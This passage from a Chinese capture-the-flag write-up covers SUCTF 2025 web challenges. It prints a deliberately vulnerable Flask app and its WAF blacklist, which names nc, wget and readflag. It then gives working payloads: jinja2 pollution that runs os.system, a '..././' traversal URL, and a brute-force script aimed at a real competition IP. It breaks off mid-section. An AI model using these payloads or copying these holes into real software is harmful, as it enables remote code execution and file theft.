class="hljs-string">&quot;testuser&quot;</span>: <span class="hljs-string">&quot;password&quot;</span>&#125;<br>BASE_DIR = <span class="hljs-string">&#x27;/var/www/html/myblog/app&#x27;</span><br><br>articles = &#123;<br>    <span class="hljs-number">1</span>: <span class="hljs-string">&quot;articles/article1.txt&quot;</span>,<br>    <span class="hljs-number">2</span>: <span class="hljs-string">&quot;articles/article2.txt&quot;</span>,<br>    <span class="hljs-number">3</span>: <span class="hljs-string">&quot;articles/article3.txt&quot;</span><br>&#125;<br><br>friend_links = [<br>    &#123;<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;bkf1sh&quot;</span>, <span class="hljs-string">&quot;url&quot;</span>: <span class="hljs-string">&quot;https://ctf.org.cn/&quot;</span>&#125;,<br>    &#123;<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;fushuling&quot;</span>, <span class="hljs-string">&quot;url&quot;</span>: <span class="hljs-string">&quot;https://fushuling.com/&quot;</span>&#125;,<br>    &#123;<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;yulate&quot;</span>, <span class="hljs-string">&quot;url&quot;</span>: <span class="hljs-string">&quot;https://www.yulate.com/&quot;</span>&#125;,<br>    &#123;<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;zimablue&quot;</span>, <span class="hljs-string">&quot;url&quot;</span>: <span class="hljs-string">&quot;https://www.zimablue.life/&quot;</span>&#125;,<br>    &#123;<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;baozongwi&quot;</span>, <span class="hljs-string">&quot;url&quot;</span>: <span class="hljs-string">&quot;https://baozongwi.xyz/&quot;</span>&#125;,<br>]<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">pass</span><br><br>user_data = User()<br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;username&#x27;</span> <span class="hljs-keyword">in</span> session:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;blog.html&#x27;</span>, articles=articles, friend_links=friend_links)<br>    <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;login&#x27;</span>))<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/login&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        username = request.form[<span class="hljs-string">&#x27;username&#x27;</span>]<br>        password = request.form[<span class="hljs-string">&#x27;password&#x27;</span>]<br>        <span class="hljs-keyword">if</span> username <span class="hljs-keyword">in</span> users <span class="hljs-keyword">and</span> users[username] == password:<br>            session[<span class="hljs-string">&#x27;username&#x27;</span>] = username<br>            <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>))<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Invalid credentials&quot;</span>, <span class="hljs-number">403</span><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;login.html&#x27;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/register&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">register</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        username = request.form[<span class="hljs-string">&#x27;username&#x27;</span>]<br>        password = request.form[<span class="hljs-string">&#x27;password&#x27;</span>]<br>        users[username] = password<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;login&#x27;</span>))<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;register.html&#x27;</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/change_password&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">change_password</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;username&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> session:<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;login&#x27;</span>))<br><br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        old_password = request.form[<span class="hljs-string">&#x27;old_password&#x27;</span>]<br>        new_password = request.form[<span class="hljs-string">&#x27;new_password&#x27;</span>]<br>        confirm_password = request.form[<span class="hljs-string">&#x27;confirm_password&#x27;</span>]<br><br>        <span class="hljs-keyword">if</span> users[session[<span class="hljs-string">&#x27;username&#x27;</span>]] != old_password:<br>            flash(<span class="hljs-string">&quot;Old password is incorrect&quot;</span>, <span class="hljs-string">&quot;error&quot;</span>)<br>        <span class="hljs-keyword">elif</span> new_password != confirm_password:<br>            flash(<span class="hljs-string">&quot;New passwords do not match&quot;</span>, <span class="hljs-string">&quot;error&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            users[session[<span class="hljs-string">&#x27;username&#x27;</span>]] = new_password<br>            flash(<span class="hljs-string">&quot;Password changed successfully&quot;</span>, <span class="hljs-string">&quot;success&quot;</span>)<br>            <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>))<br><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;change_password.html&#x27;</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/friendlinks&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">friendlinks</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;username&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> session <span class="hljs-keyword">or</span> session[<span class="hljs-string">&#x27;username&#x27;</span>] != <span class="hljs-string">&#x27;admin&#x27;</span>:<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;login&#x27;</span>))<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;friendlinks.html&#x27;</span>, links=friend_links)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/add_friendlink&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add_friendlink</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;username&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> session <span class="hljs-keyword">or</span> session[<span class="hljs-string">&#x27;username&#x27;</span>] != <span class="hljs-string">&#x27;admin&#x27;</span>:<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;login&#x27;</span>))<br><br>    name = request.form.get(<span class="hljs-string">&#x27;name&#x27;</span>)<br>    url = request.form.get(<span class="hljs-string">&#x27;url&#x27;</span>)<br><br>    <span class="hljs-keyword">if</span> name <span class="hljs-keyword">and</span> url:<br>        friend_links.append(&#123;<span class="hljs-string">&quot;name&quot;</span>: name, <span class="hljs-string">&quot;url&quot;</span>: url&#125;)<br><br>    <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;friendlinks&#x27;</span>))<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/delete_friendlink/&lt;int:index&gt;&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete_friendlink</span>(<span class="hljs-params">index</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;username&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> session <span class="hljs-keyword">or</span> session[<span class="hljs-string">&#x27;username&#x27;</span>] != <span class="hljs-string">&#x27;admin&#x27;</span>:<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;login&#x27;</span>))<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-number">0</span> &lt;= index &lt; <span class="hljs-built_in">len</span>(friend_links):<br>        <span class="hljs-keyword">del</span> friend_links[index]<br><br>    <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;friendlinks&#x27;</span>))<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/article&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">article</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;username&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> session:<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;login&#x27;</span>))<br><br>    file_name = request.args.get(<span class="hljs-string">&#x27;file&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> file_name:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;article.html&#x27;</span>, file_name=<span class="hljs-string">&#x27;&#x27;</span>, content=<span class="hljs-string">&quot;未提供文件名。&quot;</span>)<br><br>    blacklist = [<span class="hljs-string">&quot;waf.py&quot;</span>]<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">any</span>(blacklisted_file <span class="hljs-keyword">in</span> file_name <span class="hljs-keyword">for</span> blacklisted_file <span class="hljs-keyword">in</span> blacklist):<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;article.html&#x27;</span>, file_name=file_name, content=<span class="hljs-string">&quot;大黑阔不许看&quot;</span>)<br>    <br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> file_name.startswith(<span class="hljs-string">&#x27;articles/&#x27;</span>):<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;article.html&#x27;</span>, file_name=file_name, content=<span class="hljs-string">&quot;无效的文件路径。&quot;</span>)<br>    <br>    <span class="hljs-keyword">if</span> file_name <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> articles.values():<br>        <span class="hljs-keyword">if</span> session.get(<span class="hljs-string">&#x27;username&#x27;</span>) != <span class="hljs-string">&#x27;admin&#x27;</span>:<br>            <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;article.html&#x27;</span>, file_name=file_name, content=<span class="hljs-string">&quot;无权访问该文件。&quot;</span>)<br>    <br>    file_path = os.path.join(BASE_DIR, file_name)<br>    file_path = file_path.replace(<span class="hljs-string">&#x27;../&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>    <br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            content = f.read()<br>    <span class="hljs-keyword">except</span> FileNotFoundError:<br>        content = <span class="hljs-string">&quot;文件未找到。&quot;</span><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        app.logger.error(<span class="hljs-string">f&quot;Error reading file <span class="hljs-subst">&#123;file_path&#125;</span>: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>        content = <span class="hljs-string">&quot;读取文件时发生错误。&quot;</span><br><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;article.html&#x27;</span>, file_name=file_name, content=content)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/Admin&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">admin</span>():<br>    <span class="hljs-keyword">if</span> request.args.get(<span class="hljs-string">&#x27;pass&#x27;</span>)!=<span class="hljs-string">&quot;SUers&quot;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;nonono&quot;</span><br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        <span class="hljs-keyword">try</span>:<br>            body = request.json<br><br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> body:<br>                flash(<span class="hljs-string">&quot;No JSON data received&quot;</span>, <span class="hljs-string">&quot;error&quot;</span>)<br>                <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;No JSON data received&quot;</span>&#125;), <span class="hljs-number">400</span><br><br>            key = body.get(<span class="hljs-string">&#x27;key&#x27;</span>)<br>            value = body.get(<span class="hljs-string">&#x27;value&#x27;</span>)<br><br>            <span class="hljs-keyword">if</span> key <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">or</span> value <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>                flash(<span class="hljs-string">&quot;Missing required keys: &#x27;key&#x27; or &#x27;value&#x27;&quot;</span>, <span class="hljs-string">&quot;error&quot;</span>)<br>                <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Missing required keys: &#x27;key&#x27; or &#x27;value&#x27;&quot;</span>&#125;), <span class="hljs-number">400</span><br><br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> pwaf(key):<br>                flash(<span class="hljs-string">&quot;Invalid key format&quot;</span>, <span class="hljs-string">&quot;error&quot;</span>)<br>                <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Invalid key format&quot;</span>&#125;), <span class="hljs-number">400</span><br><br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> cwaf(value):<br>                flash(<span class="hljs-string">&quot;Invalid value format&quot;</span>, <span class="hljs-string">&quot;error&quot;</span>)<br>                <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Invalid value format&quot;</span>&#125;), <span class="hljs-number">400</span><br><br>            set_(user_data, key, value)<br><br>            flash(<span class="hljs-string">&quot;User data updated successfully&quot;</span>, <span class="hljs-string">&quot;success&quot;</span>)<br>            <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;User data updated successfully&quot;</span>&#125;), <span class="hljs-number">200</span><br><br>        <span class="hljs-keyword">except</span> json.JSONDecodeError:<br>            flash(<span class="hljs-string">&quot;Invalid JSON data&quot;</span>, <span class="hljs-string">&quot;error&quot;</span>)<br>            <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Invalid JSON data&quot;</span>&#125;), <span class="hljs-number">400</span><br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            flash(<span class="hljs-string">f&quot;An error occurred: <span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(e)&#125;</span>&quot;</span>, <span class="hljs-string">&quot;error&quot;</span>)<br>            <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">f&quot;An error occurred: <span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(e)&#125;</span>&quot;</span>&#125;), <span class="hljs-number">500</span><br><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;admin.html&#x27;</span>, user_data=user_data)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/logout&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">logout</span>():<br>    session.pop(<span class="hljs-string">&#x27;username&#x27;</span>, <span class="hljs-literal">None</span>)<br>    flash(<span class="hljs-string">&quot;You have been logged out.&quot;</span>, <span class="hljs-string">&quot;info&quot;</span>)<br>    <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;login&#x27;</span>))<br><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>,port=<span class="hljs-number">10006</span>)<br></code></pre></td></tr></table></figure><p><code>waf.py</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python">key_blacklist = [<br>    <span class="hljs-string">&#x27;__file__&#x27;</span>, <span class="hljs-string">&#x27;app&#x27;</span>, <span class="hljs-string">&#x27;router&#x27;</span>, <span class="hljs-string">&#x27;name_index&#x27;</span>,<br>    <span class="hljs-string">&#x27;directory_handler&#x27;</span>, <span class="hljs-string">&#x27;directory_view&#x27;</span>, <span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;path&#x27;</span>, <span class="hljs-string">&#x27;pardir&#x27;</span>, <span class="hljs-string">&#x27;_static_folder&#x27;</span>,<br>    <span class="hljs-string">&#x27;__loader__&#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>,  <span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>, <span class="hljs-string">&#x27;5&#x27;</span>, <span class="hljs-string">&#x27;6&#x27;</span>, <span class="hljs-string">&#x27;7&#x27;</span>, <span class="hljs-string">&#x27;8&#x27;</span>, <span class="hljs-string">&#x27;9&#x27;</span>,<br>]<br><br>value_blacklist = [<br>    <span class="hljs-string">&#x27;ls&#x27;</span>, <span class="hljs-string">&#x27;dir&#x27;</span>, <span class="hljs-string">&#x27;nl&#x27;</span>, <span class="hljs-string">&#x27;nc&#x27;</span>, <span class="hljs-string">&#x27;cat&#x27;</span>, <span class="hljs-string">&#x27;tail&#x27;</span>, <span class="hljs-string">&#x27;more&#x27;</span>, <span class="hljs-string">&#x27;flag&#x27;</span>, <span class="hljs-string">&#x27;cut&#x27;</span>, <span class="hljs-string">&#x27;awk&#x27;</span>,<br>    <span class="hljs-string">&#x27;strings&#x27;</span>, <span class="hljs-string">&#x27;od&#x27;</span>, <span class="hljs-string">&#x27;ping&#x27;</span>, <span class="hljs-string">&#x27;sort&#x27;</span>, <span class="hljs-string">&#x27;ch&#x27;</span>, <span class="hljs-string">&#x27;zip&#x27;</span>, <span class="hljs-string">&#x27;mod&#x27;</span>, <span class="hljs-string">&#x27;sl&#x27;</span>, <span class="hljs-string">&#x27;find&#x27;</span>,<br>    <span class="hljs-string">&#x27;sed&#x27;</span>, <span class="hljs-string">&#x27;cp&#x27;</span>, <span class="hljs-string">&#x27;mv&#x27;</span>, <span class="hljs-string">&#x27;ty&#x27;</span>, <span class="hljs-string">&#x27;grep&#x27;</span>, <span class="hljs-string">&#x27;fd&#x27;</span>, <span class="hljs-string">&#x27;df&#x27;</span>, <span class="hljs-string">&#x27;sudo&#x27;</span>, <span class="hljs-string">&#x27;more&#x27;</span>, <span class="hljs-string">&#x27;cc&#x27;</span>, <span class="hljs-string">&#x27;tac&#x27;</span>, <span class="hljs-string">&#x27;less&#x27;</span>,<br>    <span class="hljs-string">&#x27;head&#x27;</span>, <span class="hljs-string">&#x27;&#123;&#x27;</span>, <span class="hljs-string">&#x27;&#125;&#x27;</span>, <span class="hljs-string">&#x27;tar&#x27;</span>, <span class="hljs-string">&#x27;zip&#x27;</span>, <span class="hljs-string">&#x27;gcc&#x27;</span>, <span class="hljs-string">&#x27;uniq&#x27;</span>, <span class="hljs-string">&#x27;vi&#x27;</span>, <span class="hljs-string">&#x27;vim&#x27;</span>, <span class="hljs-string">&#x27;file&#x27;</span>, <span class="hljs-string">&#x27;xxd&#x27;</span>,<br>    <span class="hljs-string">&#x27;base64&#x27;</span>, <span class="hljs-string">&#x27;date&#x27;</span>, <span class="hljs-string">&#x27;env&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;wget&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;id&#x27;</span>, <span class="hljs-string">&#x27;whoami&#x27;</span>, <span class="hljs-string">&#x27;readflag&#x27;</span><br>]<br><br><span class="hljs-comment"># 将黑名单转换为字节串</span><br>key_blacklist_bytes = [word.encode() <span class="hljs-keyword">for</span> word <span class="hljs-keyword">in</span> key_blacklist]<br>value_blacklist_bytes = [word.encode() <span class="hljs-keyword">for</span> word <span class="hljs-keyword">in</span> value_blacklist]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_blacklist</span>(<span class="hljs-params">data, blacklist</span>):<br>    <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> blacklist:<br>        <span class="hljs-keyword">if</span> item <span class="hljs-keyword">in</span> data:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwaf</span>(<span class="hljs-params">key</span>):<br>    <span class="hljs-comment"># 将 key 转换为字节串</span><br>    key_bytes = key.encode()<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> check_blacklist(key_bytes, key_blacklist_bytes):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Key contains blacklisted words.&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cwaf</span>(<span class="hljs-params">value</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(value) &gt; <span class="hljs-number">77</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Value exceeds 77 characters.&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <br>    <span class="hljs-comment"># 将 value 转换为字节串</span><br>    value_bytes = value.encode()<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> check_blacklist(value_bytes, value_blacklist_bytes):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Value contains blacklisted words.&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br></code></pre></td></tr></table></figure><p>读源码后发现&#x2F;Admin下可以打原型链污染，这里可以直接污染jinja2模版编译时用的一个参数来R。</p><p>本来开始想试试污染key_blacklist然后为所欲为的：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;key&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;__class__.__init__.__globals__.pwaf.__globals__.key_blacklist_bytes&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;value&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;&quot;</span> <span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>但其实不用，直接R就完了：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;key&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;__init__.__globals__.__loader__.__init__.__globals__.sys.modules.jinja2.runtime.exported.0&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;value&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;*;import os;os.system(&#x27;/readflag &gt;/tmp/sbflag.txt&#x27;)&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>然后访问一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">http://<span class="hljs-number">27.25</span><span class="hljs-number">.151</span><span class="hljs-number">.48</span>:<span class="hljs-number">10004</span>/article?file=articles/..././..././..././..././..././..././tmp/sbflag.txt<br></code></pre></td></tr></table></figure><p>然后渲染的时候就会把<code>*;import os;os.system(&#39;/readflag &gt;/tmp/sbflag.txt&#39;)</code>拼上去，然后再任意文件读就完事了。</p><p>（因为模版只在第一次访问时编译，所以需要卡容器重启时的第一次访问，这个有点坑需要手气）</p><p>也可以借鉴一下<code>Syclover</code>战队写的brute多线程：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> multiprocessing<br>js = &#123;<br>    <span class="hljs-string">&quot;key&quot;</span>: <span class="hljs-string">&quot;__class__.__init__.__globals__.__builtins__.__spec__.__init__.__globals__.sys.modules.jinja2.runtime.exported.2&quot;</span>,<br>    <span class="hljs-string">&quot;value&quot;</span>: <span class="hljs-string">&quot;*;import os;os.system(&#x27;/read\\x66lag &gt; /tmp/f&#x27;)&quot;</span>&#125;<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">brute</span>(<span class="hljs-params">url</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-keyword">try</span>:<br>            res = requests.post(url + <span class="hljs-string">&quot;/Admin?pass=SUers&quot;</span>, json=js)<br>            <span class="hljs-built_in">print</span>(url + <span class="hljs-string">&quot;:&quot;</span> + res.text)<br>            requests.get(url + <span class="hljs-string">&quot;/Admin?pass=SUers&quot;</span>)<br>            requests.get(url + <span class="hljs-string">&quot;/&quot;</span>)<br>            requests.get(url + <span class="hljs-string">&quot;/login&quot;</span>)<br>            requests.get(url + <span class="hljs-string">&quot;/register&quot;</span>)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(e)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    urls=[<span class="hljs-string">&quot;http://27.25.151.48:10000&quot;</span>,<br>         <span class="hljs-string">&quot;http://27.25.151.48:10001&quot;</span>,<br>         <span class="hljs-string">&quot;http://27.25.151.48:10002&quot;</span>,<br>         <span class="hljs-string">&quot;http://27.25.151.48:10003&quot;</span>,<br>         <span class="hljs-string">&quot;http://27.25.151.48:10004&quot;</span>,<br>         <span class="hljs-string">&quot;http://27.25.151.48:10005&quot;</span>]<br>    <span class="hljs-keyword">for</span> url <span class="hljs-keyword">in</span> urls:<br>        p = multiprocessing.Process(target=brute, args=(url,))<br>        p.start()<br></code></pre></td></tr></table></figure><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs smali">SUCTF&#123;fl4sk_1s_5imp1e_bu7_pyd45h_1s_n0t_s0_I_l0v3&#125;<br></code></pre></td></tr></table></figure><h2 id="SU-ezjava"><a href="#SU-ezjava" class="headerlink" title="SU_ezjava"></a>SU_ezjava</h2><p>开始做java了。</p><p><img src="/2025/01/15/SUCTF2025-WEB-Learning/image-20250115214329070.png" alt="image-20250115214329070"></p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs applescript">网上泄露了一个危险的接口，但是不太聪明的程序员设计了防护去保护它，你能绕过吗。顺带一提，给出的源码存在混淆<br>A dangerous interface has been leaked online, 